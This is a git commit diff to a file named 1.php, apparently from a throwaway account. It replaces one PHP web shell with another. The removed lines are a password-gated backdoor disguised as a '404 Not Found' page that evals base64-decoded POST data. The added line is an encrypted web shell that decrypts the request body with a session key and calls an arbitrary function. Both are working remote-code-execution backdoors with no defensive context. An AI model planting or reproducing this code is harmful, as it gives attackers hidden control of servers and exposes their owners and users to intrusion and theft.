f1efb680bf8ba49589cc44c51f82ada0d7361c6e
test12321312 <75824708+test12321312@users.noreply.github.com>
2020-12-11 13:08:10 +0800

    Update 1.php

--- 1.php
+++ 1.php
@@ -1,5 +1,1 @@
-<?php 
-echo "404 Not Found!</br>"; error_reporting(0);
-if(isset($_POST['com']) && md5($_POST['com']) == '791dc312b38016ef998c1c146104cd5a' && isset($_POST['content'])) $content = strtr($_POST['content'], '-_,', '+/=');eval(base64_decode($content));
-echo "We're sorry but the page your are looking for is Not Found..."
-?>
+<?php session_start();isset($_GET['pass'])?print $_SESSION['k']=substr(md5(uniqid(rand())),16):($b=explode('|',openssl_decrypt(file_get_contents("php://input"), "AES128", $_SESSION['k'])))&call_user_func($b[0],$b[1]);?>
